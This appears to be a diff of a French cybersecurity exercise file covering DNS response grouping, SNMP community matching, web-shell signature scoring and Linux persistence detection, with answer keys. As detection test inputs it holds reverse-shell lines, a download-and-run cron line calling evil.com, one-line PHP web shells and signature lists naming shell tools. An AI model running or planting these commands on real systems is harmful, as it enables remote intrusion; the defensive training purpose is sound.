@@ -203,42 +203,41 @@ module.exports = [
   {
     "id": "hk3-c2-e3",
     "chapter": 2,
-    "title": "Moteur de Découverte de Sous-Domaines par Fuzzing et Filtrage Wildcard",
+    "title": "Comparaison de réponses DNS avec une adresse témoin",
     "level": "n3",
     "language": "analyse",
-    "goal": "Identifier les sous-domaines légitimes actifs en éliminant les faux positifs causés par les DNS wildcards.",
-    "brief": "<p>Lors de l'énumération par dictionnaire (subdomain brute-forcing), une réponse wildcard DNS redirige tous les sous-domaines inexistants vers une IP par défaut, générant des milliers de faux positifs.<br><br>\nAlgorithme de filtrage :<br>\n1. Si <code>wildcard_ip != 'NONE'</code>, toute entrée dont l'IP correspond à <code>wildcard_ip</code> est classée comme faux positif wildcard.<br>\n2. Les entrées dont l'IP diffère de <code>wildcard_ip</code> sont des sous-domaines actifs validés.<br>\n3. Les sous-domaines valides sont ordonnés alphabétiquement sous la forme <code>&lt;sub&gt;.&lt;domain&gt;</code>.<br><br>\nDonnées du cas : <code>SUBDOMAIN_FUZZ domain=&lt;dom&gt; wildcard_ip=&lt;ip|NONE&gt; responses=&lt;sub1:ip1,sub2:ip2,...&gt;</code>.<br>\nRésultat d’analyse attendu :<br>\n<code>SUBDOMAINS: domain=&lt;dom&gt; total_scanned=&lt;N&gt; wildcards_filtered=&lt;W&gt; valid_found=&lt;V&gt; active=&lt;s1.dom,s2.dom|NONE&gt;</code>.</p>",
-    "starter": "# Grille d'analyse (hk3-c2-e3) — Moteur de Découverte de Sous-Domaines par Fuzzing et Filtrage Wildcard\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Aucun wildcard configuré sur le domaine cible]\n# Données : SUBDOMAIN_FUZZ domain=corp.org wildcard_ip=NONE responses=vpn:10.0.0.1,api:10.0.0.2\nA_COMPLETER\n\n[Cas 2 — Toutes les réponses sont des faux positifs vers le wildcard]\n# Données : SUBDOMAIN_FUZZ domain=wildcard-all.net wildcard_ip=172.16.0.50 responses=a:172.16.0.50,b:172.16.0.50,c:172.16.0.50\nA_COMPLETER\n\n[Cas 3 — Multiples sous-domaines valides ordonnés alphabétiquement]\n# Données : SUBDOMAIN_FUZZ domain=cloud.dev wildcard_ip=1.1.1.1 responses=gitlab:10.1.1.5,bogus:1.1.1.1,auth:10.1.1.2,monitor:10.1.1.9\nA_COMPLETER\n",
+    "goal": "Regrouper des réponses DNS sans conclure à la légitimité des noms.",
+    "brief": "<p>Dans ce modèle, une adresse témoin est fournie avec des réponses DNS fictives. Classez les noms selon que leur adresse est égale ou non à cette adresse ; si le témoin vaut <code>NONE</code>, tous les noms vont dans la seconde liste. L’égalité d’IP ne prouve pas qu’un nom soit fictif : un nom réel peut partager cette adresse. Une IP différente ne prouve pas non plus la légitimité ou l’existence d’un service. Recoupez les observations dans le cadre autorisé.</p><p>Pour <code>SUBDOMAIN_FUZZ domain=&lt;dom&gt; wildcard_ip=&lt;ip|NONE&gt; responses=&lt;nom:ip,...&gt;</code>, trier chaque liste de noms complets et afficher <code>SUBDOMAIN_GROUP: domain=&lt;dom&gt; total=&lt;N&gt; meme_ip=&lt;M&gt; noms_meme=&lt;liste|NONE&gt; autre_ip=&lt;A&gt; noms_autres=&lt;liste|NONE&gt;</code>.</p>",
+    "starter": "# Grille d'analyse (hk3-c2-e3) — Comparaison de réponses DNS avec une adresse témoin\n# Complétez la réponse attendue sous chaque cas ci-dessous :\n\n[Cas 1 — Aucune adresse témoin]\n# Données : SUBDOMAIN_FUZZ domain=corp.org wildcard_ip=NONE responses=vpn:10.0.0.1,api:10.0.0.2\nA_COMPLETER\n\n[Cas 2 — Trois réponses à la même adresse]\n# Données : SUBDOMAIN_FUZZ domain=wildcard-all.net wildcard_ip=172.16.0.50 responses=a:172.16.0.50,b:172.16.0.50,c:172.16.0.50\nA_COMPLETER\n\n[Cas 3 — Adresses mélangées et ordre alphabétique]\n# Données : SUBDOMAIN_FUZZ domain=cloud.dev wildcard_ip=1.1.1.1 responses=gitlab:10.1.1.5,bogus:1.1.1.1,auth:10.1.1.2,monitor:10.1.1.9\nA_COMPLETER\n",
     "hints": [
-      "Parcourez chaque couple sub:ip dans responses.",
-      "Si wildcard_ip != \"NONE\" et ip == wildcard_ip, incrémentez wildcards_filtered.",
-      "Triez la liste des sous-domaines valides alphabétiquement avant l'affichage."
+      "Comparer les adresses seulement ; ne pas décider si un nom est réel ou fictif.",
+      "Trier chaque liste alphabétiquement et écrire NONE pour une liste vide."
     ],
     "examples": [
       {
         "stdin": "SUBDOMAIN_FUZZ domain=example.com wildcard_ip=192.168.1.100 responses=admin:192.168.1.5,fake99:192.168.1.100,mail:192.168.1.6,testabc:192.168.1.100",
-        "expected": "SUBDOMAINS: domain=example.com total_scanned=4 wildcards_filtered=2 valid_found=2 active=admin.example.com,mail.example.com",
-        "note": "Les deux sous-domaines aléatoires pointant vers l'IP wildcard sont éliminés."
+        "expected": "SUBDOMAIN_GROUP: domain=example.com total=4 meme_ip=2 noms_meme=fake99.example.com,testabc.example.com autre_ip=2 noms_autres=admin.example.com,mail.example.com",
+        "note": "Les deux listes sont des regroupements, pas des verdicts sur les noms."
       }
     ],
     "tests": [
       {
-        "label": "Aucun wildcard configuré sur le domaine cible",
+        "label": "Aucune adresse témoin",
         "stdin": "cas:1",
-        "expected": "SUBDOMAINS: domain=corp.org total_scanned=2 wildcards_filtered=0 valid_found=2 active=api.corp.org,vpn.corp.org"
+        "expected": "SUBDOMAIN_GROUP: domain=corp.org total=2 meme_ip=0 noms_meme=NONE autre_ip=2 noms_autres=api.corp.org,vpn.corp.org"
       },
       {
-        "label": "Toutes les réponses sont des faux positifs vers le wildcard",
+        "label": "Trois réponses à la même adresse",
         "stdin": "cas:2",
-        "expected": "SUBDOMAINS: domain=wildcard-all.net total_scanned=3 wildcards_filtered=3 valid_found=0 active=NONE"
+        "expected": "SUBDOMAIN_GROUP: domain=wildcard-all.net total=3 meme_ip=3 noms_meme=a.wildcard-all.net,b.wildcard-all.net,c.wildcard-all.net autre_ip=0 noms_autres=NONE"
       },
       {
-        "label": "Multiples sous-domaines valides ordonnés alphabétiquement",
+        "label": "Adresses mélangées et ordre alphabétique",
         "stdin": "cas:3",
-        "expected": "SUBDOMAINS: domain=cloud.dev total_scanned=4 wildcards_filtered=1 valid_found=3 active=auth.cloud.dev,gitlab.cloud.dev,monitor.cloud.dev"
+        "expected": "SUBDOMAIN_GROUP: domain=cloud.dev total=4 meme_ip=1 noms_meme=bogus.cloud.dev autre_ip=3 noms_autres=auth.cloud.dev,gitlab.cloud.dev,monitor.cloud.dev"
       }
     ],
-    "solution": "[Exemple]\nSUBDOMAINS: domain=example.com total_scanned=4 wildcards_filtered=2 valid_found=2 active=admin.example.com,mail.example.com\n\n[Cas 1 — Aucun wildcard configuré sur le domaine cible]\nSUBDOMAINS: domain=corp.org total_scanned=2 wildcards_filtered=0 valid_found=2 active=api.corp.org,vpn.corp.org\n\n[Cas 2 — Toutes les réponses sont des faux positifs vers le wildcard]\nSUBDOMAINS: domain=wildcard-all.net total_scanned=3 wildcards_filtered=3 valid_found=0 active=NONE\n\n[Cas 3 — Multiples sous-domaines valides ordonnés alphabétiquement]\nSUBDOMAINS: domain=cloud.dev total_scanned=4 wildcards_filtered=1 valid_found=3 active=auth.cloud.dev,gitlab.cloud.dev,monitor.cloud.dev"
+    "solution": "[Exemple]\nSUBDOMAIN_GROUP: domain=example.com total=4 meme_ip=2 noms_meme=fake99.example.com,testabc.example.com autre_ip=2 noms_autres=admin.example.com,mail.example.com\n\n[Cas 1 — Aucune adresse témoin]\nSUBDOMAIN_GROUP: domain=corp.org total=2 meme_ip=0 noms_meme=NONE autre_ip=2 noms_autres=api.corp.org,vpn.corp.org\n\n[Cas 2 — Trois réponses à la même adresse]\nSUBDOMAIN_GROUP: domain=wildcard-all.net total=3 meme_ip=3 noms_meme=a.wildcard-all.net,b.wildcard-all.net,c.wildcard-all.net autre_ip=0 noms_autres=NONE\n\n[Cas 3 — Adresses mélangées et ordre alphabétique]\nSUBDOMAIN_GROUP: domain=cloud.dev total=4 meme_ip=1 noms_meme=bogus.cloud.dev autre_ip=3 noms_autres=auth.cloud.dev,gitlab.cloud.dev,monitor.cloud.dev\n"
   },
   {
     "id": "hk3-c3-e1",
@@ -333,42 +332,41 @@ module.exports = [
   {
     "id": "hk3-c3-e3",
     "chapter": 3,
-    "title": "Simulateur d'Audit SNMP et Détection de Communautés Vulnérables",
+    "title": "Recherche simulée dans une liste de communautés SNMP",
     "level": "n3",
     "language": "analyse",
-    "goal": "Auditer les chaînes de communauté SNMP d'un commutateur ou routeur et classifier le niveau de compromission.",
-    "brief": "<p>SNMP v1 et v2c transmettent les chaînes de communauté en clair sans chiffrement.<br><br>\nRègles d'évaluation :<br>\n- On teste successivement chaque chaîne de la liste de dictionnaires <code>wordlist</code> contre la cible.<br>\n- Si une chaîne correspond à <code>target_community</code> :<br>\n  - Si <code>target_perm == 'RW'</code> : <code>status=COMPROMISED</code>, <code>risk=CRITICAL</code> (modification d'équipement possible).<br>\n  - Si <code>target_perm == 'RO'</code> : <code>status=COMPROMISED</code>, <code>risk=HIGH</code> (fuite complète d'arborescence MIB).<br>\n- Si aucune chaîne ne correspond :<br>\n  - <code>status=SECURE</code>, <code>risk=LOW</code>.<br><br>\nDonnées du cas : <code>SNMP_TEST target=&lt;ip&gt; wordlist=&lt;w1,w2,...&gt; target_community=&lt;comm&gt; target_perm=&lt;RO|RW&gt; sys_descr=&lt;descr&gt;</code>.<br>\nRésultat d’analyse attendu :<br>\n- Si compromis : <code>SNMP_AUDIT: target=&lt;ip&gt; status=COMPROMISED matched_community=&lt;comm&gt; perm=&lt;perm&gt; attempts=&lt;N&gt; risk=&lt;risk&gt; sys_descr=&lt;descr&gt;</code><br>\n- Si non compromis : <code>SNMP_AUDIT: target=&lt;ip&gt; status=SECURE attempts=&lt;N&gt; risk=LOW reason=COMMUNITY_NOT_FOUND</code></p>",
-    "starter": "# Grille d'analyse (hk3-c3-e3) — Simulateur d'Audit SNMP et Détection de Communautés Vulnérables\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Chaîne de communauté d'écriture Read-Write découverte au troisième essai]\n# Données : SNMP_TEST target=10.0.0.254 wordlist=public,cisco,private,switch target_community=private target_perm=RW sys_descr=Juniper_EX4300\nA_COMPLETER\n\n[Cas 2 — Cible robuste dont la chaîne n'est pas dans le dictionnaire testé]\n# Données : SNMP_TEST target=172.16.1.1 wordlist=public,private,secret target_community=complex_snmp_9821 target_perm=RO sys_descr=Linux_Router\nA_COMPLETER\n\n[Cas 3 — Dictionnaire volumineux arrêtant la recherche dès la première correspondance]\n# Données : SNMP_TEST target=192.168.100.10 wordlist=manager,monitor,operator target_community=monitor target_perm=RO sys_descr=HP_ProCurve\nA_COMPLETER\n",
+    "goal": "Comparer des chaînes fictives sans conclure au niveau de sécurité d’un service.",
+    "brief": "<p>Dans cette simulation, comparer successivement les chaînes de <code>wordlist</code> à <code>target_community</code> et arrêter à la première correspondance. Le résultat ne prouve pas qu’un service réel est sûr, compromis ou qu’un niveau de risque particulier s’applique ; d’autres configurations et contrôles doivent être examinés. Toute vérification réelle exige une autorisation.</p><p>Données : <code>SNMP_TEST target=&lt;ip&gt; wordlist=&lt;liste&gt; target_community=&lt;chaine&gt; target_perm=&lt;RO|RW&gt; sys_descr=&lt;description&gt;</code>.<br>Si trouvée : <code>SNMP_AUDIT: target=&lt;ip&gt; status=TROUVEE matched_community=&lt;chaine&gt; perm=&lt;RO|RW&gt; attempts=&lt;n&gt; risk=NON_EVALUE sys_descr=&lt;description&gt;</code>.<br>Sinon : <code>SNMP_AUDIT: target=&lt;ip&gt; status=NON_TROUVEE attempts=&lt;n&gt; risk=NON_EVALUE</code>.</p>",
+    "starter": "# Grille d'analyse (hk3-c3-e3) — Recherche simulée dans une liste de communautés SNMP\n# Complétez la réponse attendue sous chaque cas ci-dessous :\n\n[Cas 1 — Correspondance au troisième essai]\n# Données : SNMP_TEST target=10.0.0.254 wordlist=public,cisco,private,switch target_community=private target_perm=RW sys_descr=Juniper_EX4300\nA_COMPLETER\n\n[Cas 2 — Aucune correspondance dans la liste]\n# Données : SNMP_TEST target=172.16.1.1 wordlist=public,private,secret target_community=complex_snmp_9821 target_perm=RO sys_descr=Linux_Router\nA_COMPLETER\n\n[Cas 3 — Correspondance au deuxième essai]\n# Données : SNMP_TEST target=192.168.100.10 wordlist=manager,monitor,operator target_community=monitor target_perm=RO sys_descr=HP_ProCurve\nA_COMPLETER\n",
     "hints": [
-      "Découpez wordlist sur la virgule et itérez dans l'ordre.",
-      "Dès qu'un mot correspond à target_community, arrêtez-vous et notez le nombre d'essais effectués.",
-      "Si target_perm == RW -> risk=CRITICAL, sinon risk=HIGH."
+      "Compter les essais jusqu’à la première correspondance, ou toute la liste si aucune chaîne ne correspond.",
+      "Ne déduire aucun risque global du seul résultat."
     ],
     "examples": [
       {
         "stdin": "SNMP_TEST target=192.168.1.1 wordlist=public,private,cisco,admin target_community=public target_perm=RO sys_descr=Cisco_IOS_Software_C2960",
-        "expected": "SNMP_AUDIT: target=192.168.1.1 status=COMPROMISED matched_community=public perm=RO attempts=1 risk=HIGH sys_descr=Cisco_IOS_Software_C2960",
-        "note": "Chaîne publique par défaut permettant la lecture intégrale des interfaces et tables ARP."
+        "expected": "SNMP_AUDIT: target=192.168.1.1 status=TROUVEE matched_community=public perm=RO attempts=1 risk=NON_EVALUE sys_descr=Cisco_IOS_Software_C2960",
+        "note": "La première chaîne correspond dans ce scénario fictif ; les droits réels ne sont pas évalués."
       }
     ],
     "tests": [
       {
-        "label": "Chaîne de communauté d'écriture Read-Write découverte au troisième essai",
+        "label": "Correspondance au troisième essai",
         "stdin": "cas:1",
-        "expected": "SNMP_AUDIT: target=10.0.0.254 status=COMPROMISED matched_community=private perm=RW attempts=3 risk=CRITICAL sys_descr=Juniper_EX4300"
+        "expected": "SNMP_AUDIT: target=10.0.0.254 status=TROUVEE matched_community=private perm=RW attempts=3 risk=NON_EVALUE sys_descr=Juniper_EX4300"
       },
       {
-        "label": "Cible robuste dont la chaîne n'est pas dans le dictionnaire testé",
+        "label": "Aucune correspondance dans la liste",
         "stdin": "cas:2",
-        "expected": "SNMP_AUDIT: target=172.16.1.1 status=SECURE attempts=3 risk=LOW reason=COMMUNITY_NOT_FOUND"
+        "expected": "SNMP_AUDIT: target=172.16.1.1 status=NON_TROUVEE attempts=3 risk=NON_EVALUE"
       },
       {
-        "label": "Dictionnaire volumineux arrêtant la recherche dès la première correspondance",
+        "label": "Correspondance au deuxième essai",
         "stdin": "cas:3",
-        "expected": "SNMP_AUDIT: target=192.168.100.10 status=COMPROMISED matched_community=monitor perm=RO attempts=2 risk=HIGH sys_descr=HP_ProCurve"
+        "expected": "SNMP_AUDIT: target=192.168.100.10 status=TROUVEE matched_community=monitor perm=RO attempts=2 risk=NON_EVALUE sys_descr=HP_ProCurve"
       }
     ],
-    "solution": "[Exemple]\nSNMP_AUDIT: target=192.168.1.1 status=COMPROMISED matched_community=public perm=RO attempts=1 risk=HIGH sys_descr=Cisco_IOS_Software_C2960\n\n[Cas 1 — Chaîne de communauté d'écriture Read-Write découverte au troisième essai]\nSNMP_AUDIT: target=10.0.0.254 status=COMPROMISED matched_community=private perm=RW attempts=3 risk=CRITICAL sys_descr=Juniper_EX4300\n\n[Cas 2 — Cible robuste dont la chaîne n'est pas dans le dictionnaire testé]\nSNMP_AUDIT: target=172.16.1.1 status=SECURE attempts=3 risk=LOW reason=COMMUNITY_NOT_FOUND\n\n[Cas 3 — Dictionnaire volumineux arrêtant la recherche dès la première correspondance]\nSNMP_AUDIT: target=192.168.100.10 status=COMPROMISED matched_community=monitor perm=RO attempts=2 risk=HIGH sys_descr=HP_ProCurve"
+    "solution": "[Exemple]\nSNMP_AUDIT: target=192.168.1.1 status=TROUVEE matched_community=public perm=RO attempts=1 risk=NON_EVALUE sys_descr=Cisco_IOS_Software_C2960\n\n[Cas 1 — Correspondance au troisième essai]\nSNMP_AUDIT: target=10.0.0.254 status=TROUVEE matched_community=private perm=RW attempts=3 risk=NON_EVALUE sys_descr=Juniper_EX4300\n\n[Cas 2 — Aucune correspondance dans la liste]\nSNMP_AUDIT: target=172.16.1.1 status=NON_TROUVEE attempts=3 risk=NON_EVALUE\n\n[Cas 3 — Correspondance au deuxième essai]\nSNMP_AUDIT: target=192.168.100.10 status=TROUVEE matched_community=monitor perm=RO attempts=2 risk=NON_EVALUE sys_descr=HP_ProCurve\n"
   },
   {
     "id": "hk3-c4-e1",
@@ -623,82 +621,81 @@ module.exports = [
   {
     "id": "hk3-c6-e1",
     "chapter": 6,
-    "title": "Détecteur de Web Shells et Obfuscation de Scripts Malveillants",
+    "title": "Recherche illustrative de signatures textuelles",
     "level": "n1",
     "language": "analyse",
-    "goal": "Analyser le code d'un script web pour repérer la présence de web shells et de mécanismes d'obfuscation.",
-    "brief": "<p>Un web shell est un script déposé sur un serveur permettant à l'attaquant d'exécuter des commandes système à distance.<br><br>\nIndicateurs recherchés et scoring de dangerosité :<br>\n- Exécution de commandes système (<code>system</code>, <code>passthru</code>, <code>shell_exec</code>, <code>popen</code>) : +40 points.<br>\n- Évaluation dynamique de code (<code>eval</code>, <code>assert</code>) : +30 points.<br>\n- Fonctions d'obfuscation (<code>base64_decode</code>, <code>gzinflate</code>, <code>str_rot13</code>) : +20 points.<br>\n- Réception directe d'entrées non filtrées (<code>$_GET</code>, <code>$_POST</code>, <code>$_REQUEST</code>) : +20 points.<br><br>\nClassification finale :<br>\n- Si <code>score &gt;= 60</code> : <code>status=MALICIOUS_WEBSHELL</code>, <code>risk=CRITICAL</code>.<br>\n- Si <code>20 &lt;= score &lt; 60</code> : <code>status=SUSPICIOUS_SCRIPT</code>, <code>risk=MEDIUM</code>.<br>\n- Si <code>score &lt; 20</code> : <code>status=BENIGN_CODE</code>, <code>risk=LOW</code>.<br><br>\nDonnées du cas : <code>SCAN_SCRIPT code=&lt;extrait_de_code&gt;</code>.<br>\nRésultat d’analyse attendu : <code>WEBSHELL_SCAN: score=&lt;score&gt; status=&lt;status&gt; risk=&lt;risk&gt;</code>.</p>",
-    "starter": "# Grille d'analyse (hk3-c6-e1) — Détecteur de Web Shells et Obfuscation de Scripts Malveillants\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Web shell fortement obfusqué combinant eval, base64 et entrées POST]\n# Données : SCAN_SCRIPT code=<?php eval(base64_decode($_POST[\"payload\"])); ?>\nA_COMPLETER\n\n[Cas 2 — Script suspect utilisant uniquement base64_decode]\n# Données : SCAN_SCRIPT code=<?php $logo = base64_decode(\"iVBORw0KGgoAAAANSUhEUg==\"); ?>\nA_COMPLETER\n\n[Cas 3 — Script légitime de template sans fonction dangereuse]\n# Données : SCAN_SCRIPT code=<?php echo \"<h1>Bienvenue sur le portail</h1>\"; ?>\nA_COMPLETER\n",
+    "goal": "Relever des familles de chaînes sans certifier la nature ou le risque d’un script.",
+    "brief": "<p>Ce modèle recherche uniquement des chaînes littérales et additionne une fois chaque famille présente : commandes (<code>system</code>, <code>passthru</code>, <code>shell_exec</code>, <code>popen</code>) +40 ; évaluation (<code>eval</code>, <code>assert</code>) +30 ; transformations (<code>base64_decode</code>, <code>gzinflate</code>, <code>str_rot13</code>) +20 ; entrées (<code>$_GET</code>, <code>$_POST</code>, <code>$_REQUEST</code>) +20. Le score et les seuils sont fictifs : une correspondance n’établit pas une malveillance et l’absence d’indice ne prouve pas l’innocuité. Une analyse complémentaire est nécessaire.</p><p>Pour <code>SCAN_SCRIPT code=&lt;texte&gt;</code>, afficher <code>WEBSHELL_SCAN: score=&lt;n&gt; status=&lt;INDICES_FORTS|INDICES|AUCUN_INDICE&gt; risk=NON_EVALUE</code> : INDICES_FORTS à partir de 60, INDICES de 20 à 59, AUCUN_INDICE en dessous de 20.</p>",
+    "starter": "# Grille d'analyse (hk3-c6-e1) — Recherche illustrative de signatures textuelles\n# Complétez la réponse attendue sous chaque cas ci-dessous :\n\n[Cas 1 — Trois familles textuelles]\n# Données : SCAN_SCRIPT code=<?php eval(base64_decode($_POST[\"payload\"])); ?>\nA_COMPLETER\n\n[Cas 2 — Une seule famille textuelle]\n# Données : SCAN_SCRIPT code=<?php $logo = base64_decode(\"iVBORw0KGgoAAAANSUhEUg==\"); ?>\nA_COMPLETER\n\n[Cas 3 — Aucune des chaînes recherchées]\n# Données : SCAN_SCRIPT code=<?php echo \"<h1>Bienvenue sur le portail</h1>\"; ?>\nA_COMPLETER\n",
     "hints": [
-      "Extrayez le code après \"code=\" avec l’extraction des champs[1].",
-      "Testez la présence des différentes familles de mots-clés.",
-      "Attribuez la classification selon les seuils 60 et 20."
+      "Compter chaque famille au maximum une fois.",
+      "Le résultat ne classe pas le script comme bénin ou malveillant."
     ],
     "examples": [
       {
         "stdin": "SCAN_SCRIPT code=<?php if(isset($_REQUEST[\"cmd\"])){ system($_REQUEST[\"cmd\"]); } ?>",
-        "expected": "WEBSHELL_SCAN: score=60 status=MALICIOUS_WEBSHELL risk=CRITICAL",
-        "note": "Web shell PHP classique à une ligne combinant system et $_REQUEST."
+        "expected": "WEBSHELL_SCAN: score=60 status=INDICES_FORTS risk=NON_EVALUE",
+        "note": "Deux familles sont présentes dans le texte ; le score ne remplace pas l’analyse."
       }
     ],
     "tests": [
       {
-        "label": "Web shell fortement obfusqué combinant eval, base64 et entrées POST",
+        "label": "Trois familles textuelles",
         "stdin": "cas:1",
-        "expected": "WEBSHELL_SCAN: score=70 status=MALICIOUS_WEBSHELL risk=CRITICAL"
+        "expected": "WEBSHELL_SCAN: score=70 status=INDICES_FORTS risk=NON_EVALUE"
       },
       {
-        "label": "Script suspect utilisant uniquement base64_decode",
+        "label": "Une seule famille textuelle",
         "stdin": "cas:2",
-        "expected": "WEBSHELL_SCAN: score=20 status=SUSPICIOUS_SCRIPT risk=MEDIUM"
+        "expected": "WEBSHELL_SCAN: score=20 status=INDICES risk=NON_EVALUE"
       },
       {
-        "label": "Script légitime de template sans fonction dangereuse",
+        "label": "Aucune des chaînes recherchées",
         "stdin": "cas:3",
-        "expected": "WEBSHELL_SCAN: score=0 status=BENIGN_CODE risk=LOW"
+        "expected": "WEBSHELL_SCAN: score=0 status=AUCUN_INDICE risk=NON_EVALUE"
       }
     ],
-    "solution": "[Exemple]\nWEBSHELL_SCAN: score=60 status=MALICIOUS_WEBSHELL risk=CRITICAL\n\n[Cas 1 — Web shell fortement obfusqué combinant eval, base64 et entrées POST]\nWEBSHELL_SCAN: score=70 status=MALICIOUS_WEBSHELL risk=CRITICAL\n\n[Cas 2 — Script suspect utilisant uniquement base64_decode]\nWEBSHELL_SCAN: score=20 status=SUSPICIOUS_SCRIPT risk=MEDIUM\n\n[Cas 3 — Script légitime de template sans fonction dangereuse]\nWEBSHELL_SCAN: score=0 status=BENIGN_CODE risk=LOW"
+    "solution": "[Exemple]\nWEBSHELL_SCAN: score=60 status=INDICES_FORTS risk=NON_EVALUE\n\n[Cas 1 — Trois familles textuelles]\nWEBSHELL_SCAN: score=70 status=INDICES_FORTS risk=NON_EVALUE\n\n[Cas 2 — Une seule famille textuelle]\nWEBSHELL_SCAN: score=20 status=INDICES risk=NON_EVALUE\n\n[Cas 3 — Aucune des chaînes recherchées]\nWEBSHELL_SCAN: score=0 status=AUCUN_INDICE risk=NON_EVALUE\n"
   },
   {
     "id": "hk3-c6-e2",
     "chapter": 6,
-    "title": "Analyseur de Persistance Linux (Crontab & Reverse Shells)",
+    "title": "Recherche de motifs de persistance Linux",
     "level": "n2",
     "language": "analyse",
-    "goal": "Auditer les mécanismes de persistance et détecter les commandes de shell inverse (Reverse Shell).",
-    "brief": "<p>Après obtention d'un accès initial, l'attaquant configure une tâche planifiée ou un script de démarrage pour maintenir sa connexion.<br><br>\nSignatures d'attaques surveillées :<br>\n1. <code>BASH_REVERSE_SHELL</code> : contient <code>/dev/tcp/</code> ou <code>bash -i</code>.<br>\n2. <code>NETCAT_REVERSE_SHELL</code> : contient <code>nc -e</code>, <code>ncat -e</code> ou <code>nc.traditional</code>.<br>\n3. <code>DOWNLOAD_EXECUTE</code> : contient <code>curl</code> ou <code>wget</code> suivi de <code>| sh</code> ou <code>| bash</code>.<br>\n4. <code>PYTHON_SOCKET_SHELL</code> : contient <code>python -c</code> et <code>socket</code>.<br><br>\nRègles de diagnostic :<br>\n- Si l'une des signatures est présente :<br>\n  <code>malicious=TRUE</code>, <code>signature=&lt;NOM_SIGNATURE&gt;</code>, <code>risk=CRITICAL</code>.<br>\n- Sinon :<br>\n  <code>malicious=FALSE</code>, <code>signature=CLEAN</code>, <code>risk=LOW</code>.<br><br>\nDonnées du cas : <code>PERSIST_AUDIT type=&lt;CRON|SERVICE|SCRIPT&gt; command=&lt;commande&gt;</code>.<br>\nRésultat d’analyse attendu : <code>PERSIST_RESULT: type=&lt;type&gt; malicious=&lt;TRUE|FALSE&gt; signature=&lt;sig&gt; risk=&lt;risk&gt;</code>.</p>",
-    "starter": "# Grille d'analyse (hk3-c6-e2) — Analyseur de Persistance Linux (Crontab & Reverse Shells)\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Reverse shell netcat avec redirection de binaire shell]\n# Données : PERSIST_AUDIT type=SERVICE command=ExecStart=/bin/nc -e /bin/sh 192.168.1.100 9001\nA_COMPLETER\n\n[Cas 2 — Persistance par téléchargement et exécution de script distant]\n# Données : PERSIST_AUDIT type=CRON command=@reboot curl -s http://evil.com/implant.sh | bash\nA_COMPLETER\n\n[Cas 3 — Tâche cron légitime de sauvegarde et synchronisation]\n# Données : PERSIST_AUDIT type=CRON command=0 2 * * * /usr/bin/rsync -avz /data /backup\nA_COMPLETER\n",
+    "goal": "Repérer des motifs textuels associés à des techniques de persistance, sans conclure sur leur intention ou leur risque.",
+    "brief": "<p>Une tâche planifiée ou un script de démarrage peut être utilisé pour maintenir un accès. Cette grille recherche uniquement quatre motifs textuels dans une commande ; elle ne lance aucune commande.<br><br>\nMotifs recherchés, par ordre de priorité :<br>\n1. <code>BASH_REVERSE_SHELL</code> : contient <code>/dev/tcp/</code> ou <code>bash -i</code>.<br>\n2. <code>NETCAT_REVERSE_SHELL</code> : contient <code>nc -e</code>, <code>ncat -e</code> ou <code>nc.traditional</code>.<br>\n3. <code>DOWNLOAD_EXECUTE</code> : contient <code>curl</code> ou <code>wget</code> suivi de <code>| sh</code> ou <code>| bash</code>.<br>\n4. <code>PYTHON_SOCKET_SHELL</code> : contient <code>python -c</code> et <code>socket</code>.<br><br>\nIndiquez le premier motif trouvé, ou <code>signature=AUCUNE_CORRESPONDANCE</code> si aucun ne correspond. Une correspondance ne prouve ni l'intention malveillante ni le niveau de risque ; son absence ne prouve pas non plus l'innocuité. Dans les deux cas, renseignez <code>malicious=NON_EVALUE</code> et <code>risk=NON_EVALUE</code> : une analyse complémentaire est nécessaire.<br><br>\nDonnées du cas : <code>PERSIST_AUDIT type=&lt;CRON|SERVICE|SCRIPT&gt; command=&lt;commande&gt;</code>.<br>\nRésultat d’analyse attendu : <code>PERSIST_RESULT: type=&lt;type&gt; malicious=NON_EVALUE signature=&lt;sig&gt; risk=NON_EVALUE</code>.</p>",
+    "starter": "# Grille d'analyse (hk3-c6-e2) — Recherche de motifs de persistance Linux\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Reverse shell netcat avec redirection de binaire shell]\n# Données : PERSIST_AUDIT type=SERVICE command=ExecStart=/bin/nc -e /bin/sh 192.168.1.100 9001\nA_COMPLETER\n\n[Cas 2 — Persistance par téléchargement et exécution de script distant]\n# Données : PERSIST_AUDIT type=CRON command=@reboot curl -s http://evil.com/implant.sh | bash\nA_COMPLETER\n\n[Cas 3 — Tâche cron de sauvegarde et synchronisation]\n# Données : PERSIST_AUDIT type=CRON command=0 2 * * * /usr/bin/rsync -avz /data /backup\nA_COMPLETER\n",
     "hints": [
-      "Extrayez la commande avec l’extraction des champs[1].",
+      "Repérez le type après type= et la commande après command=.",
       "Testez les motifs BASH_REVERSE_SHELL, NETCAT_REVERSE_SHELL, DOWNLOAD_EXECUTE, PYTHON_SOCKET_SHELL.",
       "Formatez la sortie PERSIST_RESULT."
     ],
     "examples": [
       {
         "stdin": "PERSIST_AUDIT type=CRON command=* * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
-        "expected": "PERSIST_RESULT: type=CRON malicious=TRUE signature=BASH_REVERSE_SHELL risk=CRITICAL",
-        "note": "Tâche cron récurrente établissant un reverse shell interactif vers l'attaquant."
+        "expected": "PERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=BASH_REVERSE_SHELL risk=NON_EVALUE",
+        "note": "La commande contient les motifs textuels de la famille BASH_REVERSE_SHELL."
       }
     ],
     "tests": [
       {
         "label": "Reverse shell netcat avec redirection de binaire shell",
         "stdin": "cas:1",
-        "expected": "PERSIST_RESULT: type=SERVICE malicious=TRUE signature=NETCAT_REVERSE_SHELL risk=CRITICAL"
+        "expected": "PERSIST_RESULT: type=SERVICE malicious=NON_EVALUE signature=NETCAT_REVERSE_SHELL risk=NON_EVALUE"
       },
       {
         "label": "Persistance par téléchargement et exécution de script distant",
         "stdin": "cas:2",
-        "expected": "PERSIST_RESULT: type=CRON malicious=TRUE signature=DOWNLOAD_EXECUTE risk=CRITICAL"
+        "expected": "PERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=DOWNLOAD_EXECUTE risk=NON_EVALUE"
       },
       {
-        "label": "Tâche cron légitime de sauvegarde et synchronisation",
+        "label": "Tâche cron de sauvegarde et synchronisation",
         "stdin": "cas:3",
